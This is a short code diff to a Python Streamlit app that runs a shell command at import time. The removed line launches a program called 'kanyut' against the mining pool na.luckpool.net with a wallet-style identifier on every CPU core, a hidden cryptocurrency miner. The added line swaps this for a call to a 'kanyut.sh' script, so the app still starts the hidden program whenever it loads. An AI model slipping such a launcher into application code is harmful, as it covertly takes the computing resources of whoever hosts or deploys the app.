@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('cd kanyut && ./kanyut -v -l na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.VPS1 -p x -t $(nproc --all)')
+os.system('cd kanyut && bash kanyut.sh')
 
 """
 # Welcome to Streamlit!
